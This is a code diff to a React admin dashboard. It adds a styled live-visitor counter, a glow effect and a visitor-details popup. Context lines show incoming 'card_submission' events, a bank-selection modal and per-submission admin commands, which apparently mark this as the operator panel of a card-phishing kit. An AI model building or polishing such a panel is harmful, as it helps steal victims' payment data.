@@ -4,6 +4,7 @@ import { wsClient } from '@/integrations/ws-client';
 import TypingDetector from './TypingDetector';
 import EnhancedVisitorInfo from './EnhancedVisitorInfo';
 import AdminChat from './AdminChat';
+import LiveVisitorNotification from './LiveVisitorNotification';
 
 import BankSelectionModal from './BankSelectionModal';
 
@@ -55,6 +56,7 @@ const AdminPanel = () => {
   const [newVisitorGlow, setNewVisitorGlow] = useState<boolean>(false);
   const [showBankModal, setShowBankModal] = useState(false);
   const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');
+  const [showVisitorDetails, setShowVisitorDetails] = useState<boolean>(false);
   const [adminCommands, setAdminCommands] = useState<{ [submissionId: string]: string[] }>(() => {
     const savedCommands = localStorage.getItem('admin_commands');
     return savedCommands ? JSON.parse(savedCommands) : {};
@@ -108,8 +110,12 @@ const AdminPanel = () => {
       const myId = wsClient.getSocketId();
       if (visitor.id === myId) return;
       setActiveVisitors(prev => {
-        const updatedVisitors = prev.find(v => v.id === visitor.id) ? prev : [...prev, visitor];
-        setNewVisitorGlow(true); // Activate glow on new visitor
+        const isNewVisitor = !prev.find(v => v.id === visitor.id);
+        const updatedVisitors = isNewVisitor ? [...prev, visitor] : prev;
+        if (isNewVisitor) {
+          setNewVisitorGlow(true);
+          setTimeout(() => setNewVisitorGlow(false), 3000); // Glow for 3 seconds
+        }
         return updatedVisitors;
       });
     };
@@ -120,9 +126,6 @@ const AdminPanel = () => {
       if (payload.id === myId) return;
       setActiveVisitors(prev => {
         const updatedVisitors = prev.filter(v => v.id !== payload.id);
-        if (updatedVisitors.length === 0) {
-          setNewVisitorGlow(false); // Turn off glow if no visitors left
-        }
         return updatedVisitors;
       });
     };
@@ -147,8 +150,6 @@ const AdminPanel = () => {
 
     // Register all event listeners
     wsClient.on('card_submission', handleCardSubmission);
-
-
 
     // If the socket is already connected (possible if connection event fired before listener registration),
     // immediately perform the connect handler logic to join the 'admins' room and request any queued data.
@@ -275,6 +276,10 @@ const AdminPanel = () => {
     setShowBankModal(false);
   };
 
+  const handleVisitorCountClick = () => {
+    setShowVisitorDetails(!showVisitorDetails);
+  };
+
   return (
     <div className="min-h-screen bg-gray-900 text-white p-4">
       {/* Connection Status */}
@@ -289,13 +294,34 @@ const AdminPanel = () => {
         </span>
       </div>
 
-      {/* Live Visitor Count */} 
+      {/* Modern Live Visitor Count */} 
       <div className="fixed top-4 left-4 z-50">
-        <div className={`relative w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xl transition-all duration-300 ${newVisitorGlow ? 'bg-blue-600 shadow-lg animate-pulse' : 'bg-gray-700'}`}>
-          {activeVisitors.length}
-          {activeVisitors.length === 1 ? ' Visitor' : ' Visitors'}
+        <div 
+          className={`relative w-20 h-20 rounded-full flex items-center justify-center text-white font-bold text-lg cursor-pointer transition-all duration-500 backdrop-blur-md bg-white/10 border border-white/20 shadow-xl ${
+            newVisitorGlow ? 'animate-pulse shadow-blue-500/50 shadow-2xl scale-110' : 'hover:scale-105'
+          }`}
+          onClick={handleVisitorCountClick}
+          style={{
+            backdropFilter: 'blur(10px)',
+            background: 'rgba(255, 255, 255, 0.1)',
+          }}
+        >
+          <div className="text-center">
+            <div className="text-2xl font-bold">{activeVisitors.length}</div>
+            <div className="text-xs opacity-80">Visitors</div>
+          </div>
+          {newVisitorGlow && (
+            <div className="absolute inset-0 rounded-full bg-blue-400/30 animate-ping"></div>
+          )}
         </div>
       </div>
+
+      {/* Live Visitor Details Notification */}
+      {showVisitorDetails && (
+        <LiveVisitorNotification 
+          visitors={activeVisitors} 
+        />
+      )}
 
       {/* Notifications */}
       {notification && (
